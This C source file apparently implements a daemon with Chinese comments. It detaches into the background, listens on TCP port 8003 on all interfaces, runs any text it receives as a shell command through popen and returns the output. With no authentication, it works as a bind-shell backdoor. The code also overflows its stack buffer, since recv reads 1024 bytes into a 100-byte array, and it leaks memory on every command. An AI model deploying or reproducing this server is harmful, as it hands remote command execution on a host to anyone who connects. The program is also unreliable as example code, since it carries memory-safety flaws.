#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#define MAXFILE 65535 // 最大的文件描述符
char* result;
long lenght = 1024;

void executeCMD(const char *cmd) {

	char buf_ps[1024];
	char ps[1024] = { 0 };
	int i = 1;
	char *result2 = NULL;
	FILE *ptr = NULL;
	strcpy(ps, cmd);
	if ((ptr = popen(ps, "r")) != NULL) {
		result = (char *) malloc(lenght * sizeof(char));
		char *result2 = (char *) malloc(lenght * sizeof(char));

		while (fgets(buf_ps, 1024, ptr) != NULL) {
			result = (char *) malloc(lenght * i * sizeof(char));
			if (result2 != NULL)
				strcpy(result, result2);
			strcat(result, buf_ps);
			i++;
			result2 = (char *) malloc(lenght * (i - 1) * sizeof(char));
			strcpy(result2, result);
		}
		pclose(ptr);
		ptr = NULL;
	} else {
		printf("popen %s error\n", ps);
	}

}

int main() {
	pid_t pc;
	int i, fd;

	pc = fork();

	if (pc < 0) {
		printf("error fork/n");
		exit(1);
	} else if (pc > 0)
		exit(0); // 父进程退出 , 这个子进程变成孤儿进程 , 由 init 进程接管 ,
	setsid(); // 变为后台程序
	chdir("/");
	umask(0); // 对所有的权限开放
	for (i = 0; i < MAXFILE; i++)
		close(i); // 关闭所有的不需要的文件描述符

	int server_sockfd; //服务器端套接字
	int client_sockfd; //客户端套接字
	int len;
	struct sockaddr_in my_addr;   //服务器网络地址结构体
	struct sockaddr_in remote_addr; //客户端网络地址结构体
	int sin_size;
	char buf[100];  //数据传送的缓冲区
	memset(&my_addr, 0, sizeof(my_addr)); //数据初始化--清零
	my_addr.sin_family = AF_INET; //设置为IP通信
	my_addr.sin_addr.s_addr = INADDR_ANY; //服务器IP地址--允许连接到所有本地地址上
	my_addr.sin_port = htons(8003); //服务器端口号

	/*创建服务器端套接字--IPv4协议，面向连接通信，TCP协议*/
	if ((server_sockfd = socket(PF_INET, SOCK_STREAM, 0)) < 0) {
		perror("socket");
		return 1;
	}

	/*将套接字绑定到服务器的网络地址上*/
	if (bind(server_sockfd, (struct sockaddr *) &my_addr,
			sizeof(struct sockaddr)) < 0) {
		perror("bind");
		return 1;
	}

	/*监听连接请求--监听队列长度为5*/
	listen(server_sockfd, 5);

	sin_size = sizeof(struct sockaddr_in);

	while (1) // 守护进程实现的服务
	{

		printf("等待连接...\n");

		if ((client_sockfd = accept(server_sockfd,
				(struct sockaddr *) &remote_addr, &sin_size)) < 0) {
			perror("accept");
			//return 1;
		}
		printf("接受到一个连接：%s \r\n", inet_ntoa(remote_addr.sin_addr));

		if ((len = recv(client_sockfd, buf, 1024, 0)) > 0) {
			buf[len] = '\0';
			printf("%s\n", buf);
			executeCMD(buf);
			if (strlen(result) == 0) {
				strcpy(result, "Returing is null!");
			}
			if (send(client_sockfd, result, strlen(result), 0) < 0) {
				perror("write");
				//return 1;
			}
		}
		close(client_sockfd);
	}

	close(server_sockfd);
	return 0;
}
